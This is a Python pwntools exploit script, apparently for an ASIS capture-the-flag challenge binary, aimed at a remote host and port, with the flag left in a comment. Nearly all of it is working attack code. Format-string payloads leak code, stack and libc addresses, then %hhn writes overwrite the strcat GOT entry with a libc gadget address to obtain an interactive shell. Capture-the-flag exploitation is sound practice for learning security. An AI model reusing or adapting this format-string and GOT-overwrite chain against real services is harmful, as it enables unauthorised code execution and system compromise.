#!/usr/bin/env python
# encoding: utf-8
#ASIS{1e793021380441b8fdd0a183e512fb6e}
__author__  = 'b1gtang'

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

BINARY = './ross.elf'
TARGET = ('82.196.10.106', 31337)

if args.E: # or args.R:
    LIBC64 = './libc.so.6'
else:
    LIBC64 = '/lib/x86_64-linux-gnu/libc.so.6'

if args.R:
    r = remote(TARGET[0], TARGET[1])
else:
    r = process(BINARY, env={'LD_PRELOAD':LIBC64})

def attach(addr):
    if addr <= 0x400000:
        addr = addr + 0x555555554000
    gdb.attach(r, gdbscript='b *0x%x' % addr)

code = ELF(BINARY)
libc = ELF(LIBC64)
#attach(0x1312)

token = '0813373000000931337'
r.sendafter('Enter your token: ', token)
nickname = 'bigtang'
r.sendlineafter('Enter your nick: ', nickname)

r.sendlineafter('>>', '1')

r.sendlineafter('bigtang:', '\\a%6$p')
r.recvuntil('\\a')
code.address = int(r.recv(14), 16) - 0x1190
log.info('code address: %#x' % code.address)
r.sendlineafter('bigtang:', '\\a%8$p')
r.recvuntil('\\a')
stack = int(r.recv(14), 16)
log.info('stack address: %#x' % stack)
r.sendlineafter('bigtang:', '\\a%15$p')
r.recvuntil('\\a')
libc.address = int(r.recv(14), 16) - 0x8cf51#0x7ffff79e4000
log.info('libc address: %#x' % libc.address)

p = '\\a'
p += 'a'*6
p += '\x00'*0x58
p += p64(code.got['strcat'])
p += p64(code.got['strcat']+1)
p += p64(code.got['strcat']+2)
p += p64(code.got['strcat']+3)
r.sendlineafter('bigtang:', p)

#w = libc.sym['system'] & 0xffffffff
w = (libc.address + 0x10a38c)& 0xffffffff
w0 = w & 0xff
w1 = (w >> 8) & 0xff
w2 = (w >> 16) & 0xff
w3 = (w >> 24) & 0xff
log.info('system %#x' % w)

c = len('cmd is invalid: ')
p  = '\\a'
c += len(p)
p += '%{}c'.format((w0-c)&0xff)
p += '%26$hhn'
p += '%{}c'.format((w1-w0)&0xff)
p += '%27$hhn'
p += '%{}c'.format((w2-w1)&0xff)
p += '%28$hhn'
p += '%{}c'.format((w3-w2)&0xff)
p += '%29$hhn'
r.sendlineafter('bigtang:', p)

r.sendline('\\agogogo')

r.interactive()
